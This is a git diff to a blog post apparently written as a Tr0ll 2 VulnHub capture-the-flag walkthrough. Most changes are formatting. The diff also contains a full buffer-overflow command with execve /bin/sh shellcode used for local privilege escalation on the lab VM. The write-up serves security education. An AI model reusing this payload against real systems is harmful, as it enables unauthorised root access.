@@ -26,15 +26,17 @@ description: "Tr0ll: 2 walkthrough - step by step write up for Tr0ll: 2 a VulnHu
 {:toc}
 
 
-I rooted Tr0ll 1, so thought it would be rude not to try the second VM in the Tr0ll series... Tr0ll 2 requires a buffer overflow to perform local escalation, the first VM didn't require any exploitation. However, like the first VM I'd say this is challenege is more a case of guessing credentials, trying things you think probably wont work.  
+I rooted Tr0ll 1, so thought it would be rude not to try the second VM in the Tr0ll series... [Tr0ll 2](https://www.vulnhub.com/entry/tr0ll-2,107/) requires a buffer overflow to perform local escalation, the first VM didn't require any exploitation. However, like the first VM I'd say this is challenege is more a case of guessing credentials, trying things you think probably wont work.  
 
-<p>
-The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present! :)
+### Description
+
+<p><i>
+The next machine in the Tr0ll series of VMs. This one is a step up in difficulty from the original Tr0ll but the time required to solve is approximately the same, and make no mistake, trolls are still present! :)</i>
 </p>
 
-<p>
+<p><i>
 Difficulty is beginner++ to intermediate.
-</p>
+</i></p>
 
 
 ##Enumeration 
@@ -483,7 +485,7 @@ The binaries in <code>choose_wisely/door*</code> are rotated, the largest is the
 
 <section class="shellbox">
     <div class="unit golden-large code">
-      <p class="title">fuzzing linux binary</p>
+      <p class="title">Exploit Process</p>
       <div class="shell">
         <p class="line">
           <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
@@ -504,7 +506,7 @@ The binaries in <code>choose_wisely/door*</code> are rotated, the largest is the
         </p>
         <p class="line">
           <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
-          <span class="command">./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" *<br> 10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e<br>\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')<br></span>
+          <span class="command">./r00t $(python -c 'print "A"*268 + "\x80\xfb\xff\xbf" + "\x90" * <br>10 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\<br>xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')</span>
         </p>
         <p class="line">
           <span class="prompt">root</span><span>:</span><span class="path">~</span><span>#</span>
